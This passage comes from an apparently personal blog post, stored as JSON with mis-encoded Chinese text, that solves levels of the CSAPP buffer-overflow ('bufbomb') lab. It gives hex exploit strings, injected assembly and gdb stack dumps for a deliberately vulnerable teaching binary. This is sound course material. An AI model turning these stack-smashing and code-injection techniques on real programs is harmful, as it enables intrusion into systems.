c3`\n\nè¿™é‡Œå…ˆç»™å‡ºæœ¬å±‚ç­”æ¡ˆï¼Œç„¶åçœ‹ä¸‹é¢çš„è¯´æ˜å°±èƒ½ç†è§£ï¼š\n\n```\n41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff 60 ba ff ff c7 04 25 dc a1 04 08 15 85 c9 2a c7 04 24 60 8d 04 08 c3 \n```\n\næ‰§è¡Œ `getbuff` å‡½æ•°ç»“æŸå‰ï¼Œæˆ‘ä»¬éœ€è¦çœ‹ä¸€ä¸‹æ ˆçš„åœ°å€ä»¥ä¾¿ç¡®å®šè·³è½¬åˆ°å“ªé‡Œï¼š\n\n```d\n(gdb) p /x $esp\n$1 = 0xffffba40   â©\n\n(gdb) p /x $ebp\n$2 = 0xffffba58   â–¶\n\n(gdb) x/64xb $esp\n0xffffba40:â©  0x4c    0xba    0xff    0xff    0x74    0x2b    0xdf    0xf7\n0xffffba48:     0x0b    0x38    0xe3    0xf7    ğŸ˜€0x41    0x42    0x43    0x44\n0xffffba50:     0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4cğŸ˜‰\n0xffffba58:â–¶  0xff    0xff    0xff    0xff    â¤0x60    0xba    0xff    0xffâ¤\n0xffffba60:   â˜¢0xc7    0x04    0x25    0xdc    0xa1    0x04    0x08    0x15\n0xffffba68:     0x85    0xc9    0x2a    0xc7    0x04    0x24    0x60    0x8d\n0xffffba70:     0x04    0x08    0xc3â˜¢    0x00    0xef    0xbe    0xad    0xde\n0xffffba78:     0x98    0xcc    0xff    0xff    0x05    0x91    0x04    0x08\n```\n\nä¸Šé¢å†…å®¹æ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œåœ¨ Level0 ä¸­å‡ºç°è¿‡ã€‚ğŸ˜€ğŸ˜‰æ ‡è®°å°±æ˜¯ç¨‹åºåˆ†é…çš„ 12 ä¸ªå­—èŠ‚ç¼“å†²åŒºï¼Œâ¤æ ‡è®°çš„æ˜¯è·³è½¬åˆ°çš„ç›®æ ‡åœ°å€ã€‚â˜¢æ ‡è®°çš„æ˜¯æ³¨å…¥çš„æŒ‡ä»¤ã€‚\n\nå› æ­¤â¤ä¸­åº”å¡«å†™ï¼š`0xffffba60` å¯¹åº”çš„å°ç«¯ç¼–ç ã€‚\n\nç¨‹åºç»“æœä¸ºï¼š\n\n```\nType string:Bang!: You set global_value to 0x2ac98515\n```\n\n\n## Level 3 - ç‚¸è¯ã€é€‰åšã€‘\n\n> æœ¬å±‚ä¸ºç»¼åˆå‘æ•£è€ƒå¯Ÿã€‚\n\nå…³äºæœ¬å±‚çš„æç¤ºï¼Œåœ¨ä¸Šé¢ 3 å±‚çš„ç­”æ¡ˆä¸­ï¼Œæˆ‘ä»¬ç”¨ `ff ff ff ff` æŠŠ `%ebp` çš„å€¼è¦†ç›–æ‰äº†ã€‚ä½†è¿™ä¸€å±‚ä¸å¤ªä¸€æ ·ï¼Œå®ƒä¼šæ£€æµ‹ `%ebp` çš„å€¼æ˜¯å¦æ”¹åŠ¨ã€‚\n\né¦–å…ˆç»™å‡ºäº†å®Œæ•´çš„ test å‡½æ•°ï¼š\n\n```c\nvoid test() \n{ \n\tint val; \n\tvolatile int local = 0xdeadbeef; \n\tentry_check(3); /* Make sure entered this function properly */ \n\tval = getbuf(); \n\t/* Check for corrupted stack */ \n\tif (local != 0xdeadbeef) { \n\t\tprintf(\"Sabotaged!: the stack has been corrupted\\n\"); \n\t} \n\telse if (val == cookie) { \n\t\tprintf(\"Boom!: getbuf returned 0x%x\\n\", val);   // æˆ‘ä»¬éœ€è¦è¿›å…¥åˆ°è¿™é‡Œ\n\t\tvalidate(3); \n\t} \n\telse { \n\t\tprintf(\"Dud: getbuf returned 0x%x\\n\", val); \n\t} \n}\n```\n\nè¦ç‚¹ï¼š\n\n1. `val` æ˜¯ `getbuf()` çš„è¿”å›å€¼ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹è¿™ä¸ªè¿”å›å€¼ä¸ºæˆ‘ä»¬çš„ cookie\n2. ä¿è¯ç¨‹åºåœ¨å– `local` æ—¶èƒ½æ­£ç¡®å–åˆ°é­”æ•° `0xdeadbeef`\n\nè§‚å¯Ÿ test æ±‡ç¼–ä»£ç ï¼š\n\n```d\n08049000 <test>:\n 8049000:\t55                   \tpush   %ebp\n 8049001:\t89 e5                \tmov    %esp,%ebp\n 8049003:\t83 ec 18             \tsub    $0x18,%esp\n 8049006:\tc7 45 fc ef be ad de \tmovl   $0xdeadbeef,-0x4(%ebp) ; %ebp: 0xffffba78\n 804900d:\tc7 04 24 03 00 00 00 \tmovl   $0x3,(%esp)\n 8049014:\te8 87 f9 ff ff       \tcall   80489a0 <entry_check>\n 8049019:\te8 c2 ff ff ff       \tcall   8048fe0 <getbuf>\n 804901e:\t89 c2                \tmov    %eax,%edx        # %edx å­˜å‚¨ getbuf è¿”å›å€¼\n 8049020:\t8b 45 fc             \tmov    -0x4(%ebp),%eax  # local = -0x4(%ebp)\n 8049023:\t3d ef be ad de       \tcmp    $0xdeadbeef,%eax\n 8049028:\t74 0e                \tje     8049038 <test+0x38> # å¿…é¡»ç›¸ç­‰\n 804902a:\tc7 04 24 b8 98 04 08 \tmovl   $0x80498b8,(%esp)\n;  (gdb) p (char*) 0x80498b8\n; $10 = 0x80498b8 \"Sabotaged!: the stack has been corrupted\"\n 8049031:\te8 de f6 ff ff       \tcall   8048714 <puts@plt>\n 8049036:\tc9                   \tleave  \n 8049037:\tc3                   \tret    \n 8049038:\t3b 15 cc a1 04 08    \tcmp    0x804a1cc,%edx #  0x804a1cc å­˜å‚¨çš„æ˜¯cookieå­—ç¬¦ä¸² 0x2ac98515 å¯¹åº”æˆ‘çš„å­¦å·\n 804903e:\t74 12                \tje     8049052 <test+0x52>  # å¿…é¡»ç›¸ç­‰\n 8049040:\t89 54 24 04          \tmov    %edx,0x4(%esp)\n 8049044:\tc7 04 24 9b 9a 04 08 \tmovl   $0x8049a9b,(%esp)\n;  (gdb) p (char*) 0x8049a9b\n; $11 = 0x8049a9b \"Dud: getbuf returned 0x%x\\n\"\n 804904b:\te8 14 f7 ff ff       \tcall   8048764 <printf@plt>\n 8049050:\tc9                   \tleave  \n 8049051:\tc3                   \tret    \n 8049052:\t89 54 24 04          \tmov    %edx,0x4(%esp)\n 8049056:\tc7 04 24 7e 9a 04 08 \tmovl   $0x8049a7e,(%esp) #  <- ç›®æ ‡å­—ç¬¦ä¸²\n;  (gdb) p (char*) 0x8049a7e\n; $12 = 0x8049a7e \"Boom!: getbuf returned 0x%x\\n\"\n 804905d:\te8 02 f7 ff ff       \tcall   8048764 <printf@plt>\n 8049062:\tc7 04 24 03 00 00 00 \tmovl   $0x3,(%esp)\n 8049069:\te8 72 fa ff ff       \tcall   8048ae0 <validate>\n 804906e:\tc9                   \tleave  \n 804906f:\tc3                   \tret \n```\n\nä»£ç è§‚å¯Ÿï¼š\n\n- åœ°å€ `8049006`ï¼šè§‚å¯Ÿåˆ°ï¼Œ`$0xdeadbeef` å­˜å‚¨åœ¨ `-0x4(%ebp)`ï¼Œæ­¤æ—¶å¯¹åº”çš„ `%ebp` ä¸º: `0xffffba78`ï¼Œä¹Ÿå°±æ˜¯ `$0xdeadbeef` å­˜å‚¨åœ¨ `0xffffba74`ã€‚\n- åœ°å€ `804901e`ï¼š`%edx` å­˜å‚¨ `getbuf` è¿”å›å€¼\n- åœ°å€ `8049020` åˆ° `8049028`ï¼šå°† `-0x4(%ebp)` å–å‡ºæ¥å’Œ `$0xdeadbeef` æ¯”è¾ƒã€‚\n- åœ°å€ `8049038` åˆ° `804903e`ï¼šæ¯”è¾ƒ `getbuf` è¿”å›å€¼å’Œ cookie æ˜¯å¦ç›¸ç­‰\n\næˆ‘ä»¬éƒ½çŸ¥é“å‡½æ•°æ‰§è¡Œç»“æœä¸€èˆ¬æ”¾åœ¨ `%eax`ï¼Œ`getbuf` å‡½æ•°ä¹Ÿæ˜¯ä¸€æ ·ï¼Œæˆ‘ä»¬æ³¨å…¥çš„æŒ‡ä»¤ï¼Œåº”è¯¥è¦ä¿®æ”¹ `%eax` ä¸ºæˆ‘ä»¬çš„ cookieï¼Œåœ¨ `getbuf` å‹å…¥ test å‡½æ•°è°ƒç”¨æ—¶æ­£å¸¸è¿”å›çš„ä½ç½® `0x804901e`ã€‚åœ¨è¿”å›åˆ° test æ—¶ä¼šä½¿ç”¨ `%ebp`ï¼Œæˆ‘ä»¬çš„æ³¨å…¥ä»£ç ä¸åº”è¯¥åŠ¨è¿™ä¸ªå€¼ã€‚\n\n### æ–¹æ¡ˆ 1ï¼šè¦†ç›–æ­£ç¡®çš„ `%ebp`\n\nç¼–å†™çš„ `level3.s` ä¸ºï¼š\n\n```\nmovl $0x2ac98515,%eax\nmovl $0x804901e,(%rsp)\nret\n```\n\nå¾—åˆ°çš„åæ±‡ç¼–æ–‡ä»¶ï¼š\n\n```d\nlevel3.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 <.text>:\n   0:\tb8 15 85 c9 2a       \tmov    $0x2ac98515,%eax\n   5:\tc7 04 24 1e 90 04 08 \tmovl   $0x804901e,(%rsp)\n   c:\tc3                   \tretq   \n\n```\n\nç¼–å†™æŒ‡ä»¤åšä¸¤ä»¶äº‹ï¼š\n\n1. ä¿®æ”¹ `getbuf` çš„è¿”å›å€¼\n2. è·³è½¬åˆ° `test` æ­£ç¡®çš„ä½ç½®\n\nç­”æ¡ˆï¼š\n\n```\n# ç­”æ¡ˆ 1 \n41 42 43 44 45 46 47 48 49 4a 4b 4c ğŸ”¹78 ba ff ffğŸ”¹ â¤60 ba ff ffâ¤ â˜¢b8 15 85 c9 2a c7 04 24 1e 90 04 08 c3â˜¢\n```\n\nâ¤æ ‡è®°äº†æŒ‡ä»¤æ‰§è¡Œåœ°å€ï¼Œâ˜¢æ ‡è®°äº†æ³¨å…¥çš„æŒ‡ä»¤ï¼ŒğŸ”¹æ ‡è®°äº†è¦†ç›–çš„ `%ebp`ï¼š`0xffffba78`\n\n## æ–¹æ¡ˆ 2ï¼šæŒ‡ä»¤ä¿®æ”¹ä¸ºæ­£ç¡®çš„ `%ebp`\n\nå¦å¤–ä¸€ç§ç­”æ¡ˆä¸ºåœ¨æŒ‡ä»¤ä¸­ä¿®æ”¹æ­£ç¡®çš„ `%ebp` çš„å€¼ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¸¤è€…å®ç°çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚\n\nç¼–å†™çš„ `level3.s` ä¸ºï¼š\n\n```d\nmovl $0x2ac98515,%eax\nmovl $0x804901e,(%rsp)\nmovl $0xffffba78,%ebp\nret\n```\n\nåæ±‡ç¼–ç»“æœï¼š\n\n```d\n\nlevel3.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 <.text>:\n   0:\tb8 15 85 c9 2a       \tmov    $0x2ac98515,%eax\n   5:\tc7 04 24 1e 90 04 08 \tmovl   $0x804901e,(%rsp)\n   c:\tbd 78 ba ff ff       \tmov    $0xffffba78,%ebp\n  11:\tc3                   \tretq   \n\n```\n\nç­”æ¡ˆæ–‡ä»¶ `exploit3.txt` ä¸ºï¼š\n\n```\n# ç­”æ¡ˆ 2 ã€‚å…¶ä¸­ zz zz zz zz ä¸ºä»»æ„åå…­è¿›åˆ¶æ•°\n41 42 43 44 45 46 47 48 49 4a 4b 4c ğŸ”¹zz zz zz zzğŸ”¹ â¤60 ba ff ffâ¤ â˜¢b8 15 85 c9 2a c7 04 24 1e 90 04 08 â—¾bd 78 ba ff ffâ—¾ c3â˜¢\n```\n\nâ—¾æ ‡è®°äº†æ–°å¢çš„æŒ‡ä»¤ã€‚\n\næœ€ç»ˆ `bufbomb` ç¨‹åºç»“æœä¸ºï¼š\n\n```\nType string:Boom!: getbuf returned 0x2ac98515\n```\n# æœ¬æ–‡å‚è€ƒ\n-  [gdbä¸­çœ‹å†…å­˜(xå‘½ä»¤)_gdb æŸ¥çœ‹å†…å­˜x-CSDNåšå®¢](https://blog.csdn.net/yasi_xi/article/details/9263955)\n- [ä¿®æ”¹ç¨‹åºå †æ ˆçš„å¯æ‰§è¡Œå±æ€§-CSDNåšå®¢](https://blog.csdn.net/a523442148/article/details/101253155)\n- [CSAPPè¯¾ç¨‹Lab3 attack - çŸ¥ä¹ (zhihu.com)](https://zhuanlan.zhihu.com/p/629686088)\n","categories":[{"name":"CSAPP LABS","api":"api/categories/CSAPP-LABS.json"}],"tags":[{"name":"CSAPP","api":"api/tags/CSAPP.json"},{"name":"ASM","api":"api/tags/ASM.json"},{"name":"C","api":"api/tags/C.json"},{"name":"GDB","api":"api/tags/GDB.json"},{"name":"objdump","api":"api/tags/objdump.json"}]},"api":"api/posts/p/67787353.json"}